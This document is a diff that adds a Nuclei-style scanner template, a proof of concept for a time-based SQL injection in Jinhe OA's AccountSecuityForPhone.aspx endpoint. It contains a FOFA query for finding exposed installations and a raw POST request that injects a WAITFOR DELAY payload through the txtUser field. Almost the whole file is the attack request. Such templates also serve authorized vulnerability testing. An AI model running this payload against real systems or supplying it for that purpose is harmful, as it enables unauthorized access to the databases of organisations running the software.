@@ -1,0 +1,28 @@
+id: poc-gmkgglgw7y41vbv2
+info:
+  name: 金和OA AccountSecuityForPhone.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmkgglgw7y41vbv2'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gmkgglgw7y41vbv2
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.addmenu/AccountSecuityForPhone.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    _ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=YOUR___VIEWSTATE&txtUser=1''WAITFOR+DELAY+''0:0:5''--&btnSearch=%E6%9F%A5%E8%AF%A2&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&__EVENTTARGET=&__EVENTARGUMENT='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
